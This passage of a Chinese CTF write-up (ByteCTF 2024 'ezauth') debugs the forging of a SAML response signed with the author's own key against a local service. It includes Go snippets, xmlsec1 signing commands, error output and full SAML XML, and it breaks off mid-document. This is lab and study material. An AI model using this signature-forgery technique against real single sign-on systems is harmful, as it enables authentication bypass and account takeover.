<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;samlsig:X509Certificate&gt;stringValueOfCert&lt;/samlsig:X509Certifica</span><br></pre></td></tr></table></figure>

<p>这个项目utils给了加载证书的方法，加载一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b, err := ioutil.ReadFile(&quot;/home/kali/Desktop/bytectf2024_ezauth/cert.pem&quot;)</span><br><span class="line">cert := string(b)</span><br><span class="line"></span><br><span class="line">re := regexp.MustCompile(&quot;---(.*)CERTIFICATE(.*)---&quot;)</span><br><span class="line">cert = re.ReplaceAllString(cert, &quot;&quot;)</span><br><span class="line">cert = strings.Trim(cert, &quot; \n&quot;)</span><br><span class="line">cert = strings.Replace(cert, &quot;\n&quot;, &quot;&quot;, -1)</span><br></pre></td></tr></table></figure>

<p>不报证书错了。</p>
<h3 id="报错3"><a href="#报错3" class="headerlink" title="报错3"></a>报错3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : C14N error : Relative namespace UR is invalid here : (null)</span><br><span class="line">C14N error : Internal error : checking for relative namespaces</span><br><span class="line">C14N error : Internal error : processing childrens list</span><br><span class="line">C14N error : Internal error : processing docs children list</span><br><span class="line">func=xmlSecTransformC14NExecute:file=c14n.c:line=397:obj=c14n:subj=xmlC14NExecute:error=5:libxml2 library function failed:xml error: 1: Internal error : processing docs children list</span><br><span class="line"></span><br><span class="line">func=xmlSecTransformC14NPushXml:file=c14n.c:line=235:obj=c14n:subj=xmlSecTransformC14NExecute:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformDefaultPushXml:file=transforms.c:line=2118:obj=enveloped-signature:subj=xmlSecTransformPushXml:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformCtxXmlExecute:file=transforms.c:line=1052:obj=enveloped-signature:subj=xmlSecTransformPushXml:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformCtxExecute:file=transforms.c:line=1100:obj=unknown:subj=xmlSecTransformCtxXmlExecute:error=1:xmlsec library function fa</span><br></pre></td></tr></table></figure>

<p>不符合规范。。让chatgpt看了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">authnResponse.Issuer.SAML = &quot;&quot;</span><br><span class="line">authnResponse.Assertion.Issuer.SAML = &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>改成空就好了。</p>
<p>报错4</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731379479277.png" alt="1731379479277"></p>
<p>SAML块有问题，跟进去看看哪些地方需要修改</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112104531547.png" alt="image-20241112104531547"></p>
<p>对着解密base64，跟进，发现解密报错。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112104804430.png" alt="image-20241112104804430"></p>
<p>base字符 “+” 被替换成了 “ “，非常的典型。</p>
<p>加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodedString := url.QueryEscape(b64XML)</span><br><span class="line">encodedString = strings.Replace(encodedString, &quot;+&quot;, &quot;%2B&quot;, -1)</span><br></pre></td></tr></table></figure>

<p>成功进入Validate</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731380404419.png" alt="1731380404419"></p>
<p>对解密后的XML树的node值校验。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110123984.png" alt="image-20241112110123984"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110338510.png" alt="image-20241112110338510"></p>
<p>这两布没过，idp代码加上就好了。</p>
<h3 id="报错4"><a href="#报错4" class="headerlink" title="报错4"></a>报错4</h3><p>验证签名失败</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110554905.png" alt="image-20241112110554905"></p>
<p>跟进，观察到xmlsec1 verify时候才出的异常</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731380800515.png" alt="1731380800515"></p>
<p>签名和验证阶段的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">签名</span><br><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output /tmp/tmpgs1729266062 /tmp/tmpgs2471871990</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response /tmp/tmpgs357336979</span><br></pre></td></tr></table></figure>

<p>拷出一份没签名前的消息块idp2sp5.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;samlp:Response xmlns:samlp=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; xmlns:samlsig=&quot;http://www.w3.org/2000/09/xmldsig#&quot; Destination=&quot;http://localhost:8000/saml_consume&quot; ID=&quot;_ed59d777-c777-46ef-55e3-ab3cebf7d477&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2024-11-12T03:10:59.041732925Z&quot; InResponseTo=&quot;authnRequestIdRespondingTo&quot;&gt;</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">    &lt;samlsig:Signature Id=&quot;_944fac9f-fb10-4e72-61b6-3c8c1928777b&quot;&gt;</span><br><span class="line">        &lt;samlsig:SignedInfo&gt;</span><br><span class="line">            &lt;samlsig:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;&gt;&lt;/samlsig:CanonicalizationMethod&gt;</span><br><span class="line">            &lt;samlsig:SignatureMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;&gt;&lt;/samlsig:SignatureMethod&gt;</span><br><span class="line">            &lt;samlsig:Reference URI=&quot;&quot;&gt;</span><br><span class="line">                &lt;samlsig:Transforms&gt;</span><br><span class="line">                    &lt;samlsig:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;&gt;&lt;/samlsig:Transform&gt;</span><br><span class="line">                &lt;/samlsig:Transforms&gt;</span><br><span class="line">                &lt;samlsig:DigestMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;&gt;&lt;/samlsig:DigestMethod&gt;</span><br><span class="line">                &lt;samlsig:DigestValue&gt;&lt;/samlsig:DigestValue&gt;</span><br><span class="line">            &lt;/samlsig:Reference&gt;</span><br><span class="line">        &lt;/samlsig:SignedInfo&gt;</span><br><span class="line">        &lt;samlsig:SignatureValue&gt;&lt;/samlsig:SignatureValue&gt;</span><br><span class="line">        &lt;samlsig:KeyInfo&gt;</span><br><span class="line">            &lt;samlsig:X509Data&gt;</span><br><span class="line">                &lt;samlsig:X509Certificate&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:X509Certificate&gt;</span><br><span class="line">            &lt;/samlsig:X509Data&gt;</span><br><span class="line">        &lt;/samlsig:KeyInfo&gt;</span><br><span class="line">    &lt;/samlsig:Signature&gt;</span><br><span class="line">    &lt;samlp:Status&gt;</span><br><span class="line">        &lt;samlp:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;&gt;&lt;/samlp:StatusCode&gt;</span><br><span class="line">    &lt;/samlp:Status&gt;</span><br><span class="line">    &lt;saml:Assertion ID=&quot;_132ebb3f-a299-42c8-5960-f21bed10cce7&quot; Version=&quot;2.0&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; IssueInstant=&quot;2024-11-12T03:10:59.041740369Z&quot;&gt;</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">        &lt;saml:Subject&gt;</span><br><span class="line">            &lt;saml:NameID Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;&gt;userIdThatYouAuthenticated&lt;/saml:NameID&gt;</span><br><span class="line">            &lt;saml:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;</span><br><span class="line">                &lt;saml:SubjectConfirmationData InResponseTo=&quot;authnRequestIdRespondingTo&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.04174105Z&quot; Recipient=&quot;http://localhost:8000/saml_consume&quot;&gt;&lt;/saml:SubjectConfirmationData&gt;</span><br><span class="line">            &lt;/saml:SubjectConfirmation&gt;</span><br><span class="line">        &lt;/saml:Subject&gt;</span><br><span class="line">        &lt;saml:Conditions NotBefore=&quot;2024-11-12T03:05:59.041741731Z&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.041742162Z&quot;&gt;&lt;/saml:Conditions&gt;</span><br><span class="line">        &lt;saml:AttributeStatement&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;uid&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;userIdThatYouAuthenticated&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;email&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;someone@domain&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">        &lt;/saml:AttributeStatement&gt;</span><br><span class="line">    &lt;/saml:Assertion&gt;</span><br><span class="line">&lt;/samlp:Response&gt;                                                                                                                                                                                                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>新开一个终端命令行 用xmlsec1做做测试 让签名后的结果为 signed-idp2sp5.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br></pre></td></tr></table></figure>

<h3 id="报错5"><a href="#报错5" class="headerlink" title="报错5"></a>报错5</h3><p>之前没有报错的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">authnResponse.Issuer.SAML = &quot;&quot;</span><br><span class="line">authnResponse.Assertion.Issuer.SAML = &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时又报错了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">idp2sp5.xml:3: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                              ^</span><br><span class="line">idp2sp5.xml:27: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                                  ^</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                           </span><br></pre></td></tr></table></figure>

<p>但他并不影响signed-idp2sp5.xml的生成</p>
<p>查了一下SAML Response结构里xmlns:saml&#x3D;””是什么。</p>
<p><a target="_blank" rel="noopener" href="https://www.samltool.com/generic_sso_res.php">SAML Response Examples - SAML Assertion Example | SAMLTool.com</a></p>
<p>发现没有也还可以，删掉。</p>
<h3 id="报错6"><a href="#报错6" class="headerlink" title="报错6"></a>报错6</h3><p>删掉后去签名验证，验证失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLEvpSignatureVerify:file=evp_signatures.c:line=453:obj=rsa-sha1:subj=unknown:error=18:data do not match:details=EVP_VerifyFinal: signature verification failed</span><br><span class="line">FAIL</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">Error: failed to verify file &quot;signed-idp2sp5.xml&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里不确定说的是哪个证书(公钥)有问题，我们先用一组对称的密钥来签名验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br></pre></td></tr></table></figure>

<p>显示用对称密钥加解密就能成功。显然是xml中的证书的格式不对，没起到作用（因为我们在xml中放的就是cert.pem）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找一个文档示例代码看看</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731382498145.png" alt="1731382498145"></p>
<p>用这个代码去xmlsec1验证，同样失败。</p>
<p>翻规范手册</p>
<blockquote>
<p><code>KeyInfo</code> 是一个可选元素，它使收件人能够获取验证签名所需的密钥。<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xmldsig-core/#sec-X509Data">XML 签名语法和处理版本 1.1 — XML Signature Syntax and Processing Version 1.1</a></p>
</blockquote>
<p>pysaml2中提供的示范代码，将RSA key 提供在了以下地方</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731383439310-17313834573841.png" alt="1731383439310"></p>
<p>正如规范所约束</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112115144681.png" alt="image-20241112115144681"></p>
<p>go-saml2库的xml结构体中定义了x509</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KeyInfo: KeyInfo&#123;</span><br><span class="line">	XMLName: xml.Name&#123;</span><br><span class="line">		Local: &quot;samlsig:KeyInfo&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	X509Data: X509Data&#123;</span><br><span class="line">		XMLName: xml.Name&#123;</span><br><span class="line">			Local: &quot;samlsig:X509Data&quot;,</span><br><span class="line">		&#125;,</span><br><span class="line">		X509Certificate: X509Certificate&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlsig:X509Certificate&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Cert: &quot;&quot;, // caller must populate cert,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>但现在我们给他赋值并没有用</p>
<p>看一下W&amp;M的wp（W&amp;M的web真的强，DJB的web也是顶流）</p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team</a></p>
<blockquote>
<p><code>KeyValue</code> 元素包含一个可用于验证签名的公钥</p>
</blockquote>
<p>改了一下结构体</p>
<p>添加了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.Signature.KeyInfo.KeyValue.Value = cert</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接手动改一下idp2sp5.xml 生成idp2sp6.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;samlp:Response xmlns:samlp=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; xmlns:samlsig=&quot;http://www.w3.org/2000/09/xmldsig#&quot; Destination=&quot;http://localhost:8000/saml_consume&quot; ID=&quot;_ed59d777-c777-46ef-55e3-ab3cebf7d477&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2024-11-12T03:10:59.041732925Z&quot; InResponseTo=&quot;authnRequestIdRespondingTo&quot;&gt;</span><br><span class="line">    &lt;saml:Issuer&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">    &lt;samlsig:Signature Id=&quot;_944fac9f-fb10-4e72-61b6-3c8c1928777b&quot;&gt;</span><br><span class="line">        &lt;samlsig:SignedInfo&gt;</span><br><span class="line">            &lt;samlsig:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;&gt;&lt;/samlsig:CanonicalizationMethod&gt;</span><br><span class="line">            &lt;samlsig:SignatureMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;&gt;&lt;/samlsig:SignatureMethod&gt;</span><br><span class="line">            &lt;samlsig:Reference URI=&quot;&quot;&gt;</span><br><span class="line">                &lt;samlsig:Transforms&gt;</span><br><span class="line">                    &lt;samlsig:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;&gt;&lt;/samlsig:Transform&gt;</span><br><span class="line">                &lt;/samlsig:Transforms&gt;</span><br><span class="line">                &lt;samlsig:DigestMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;&gt;&lt;/samlsig:DigestMethod&gt;</span><br><span class="line">                &lt;samlsig:DigestValue&gt;&lt;/samlsig:DigestValue&gt;</span><br><span class="line">            &lt;/samlsig:Reference&gt;</span><br><span class="line">        &lt;/samlsig:SignedInfo&gt;</span><br><span class="line">        &lt;samlsig:SignatureValue&gt;&lt;/samlsig:SignatureValue&gt;</span><br><span class="line">        &lt;samlsig:KeyInfo&gt;</span><br><span class="line">            